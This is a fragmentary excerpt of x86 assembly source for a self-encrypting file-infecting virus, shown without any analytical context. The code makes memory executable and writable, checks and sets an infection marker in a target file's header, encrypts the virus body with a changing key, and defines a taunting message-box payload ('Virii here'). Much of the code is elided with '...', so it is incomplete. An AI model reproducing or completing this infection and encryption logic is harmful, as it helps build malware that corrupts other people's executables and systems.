...
.code 
Startvx:
	mov Change, offset CryptStart
	invoke VirtualProtect, Change, 9000, PAGE_EXECUTE_READWRITE, offset Oldatt
VirusStart:
...
Get:
	...
	push	eax ; restore ret address
	add		eax, 1
	push	eax
	push	eax ; reserve for MessageBoxA
...
StartInfect:
	...
	cmp		dword ptr [esi+4ch], "69"			;infected?
	jz		InfectError
	mov		dword ptr [esi+4ch], "69"			;put the infected symbol
	...
	add		byte ptr[ebp + offset CryptKey], 0ah
	call		Crypt
	popad
	rep		movsb 
...
RedundantSize			equ (offset delta - offset Startvx)
total_size			equ	(offset VirusEnd - offset VirusStart)


szTopic				db	"Virii here", 0
szText				db	"Muaahahahaha", 0
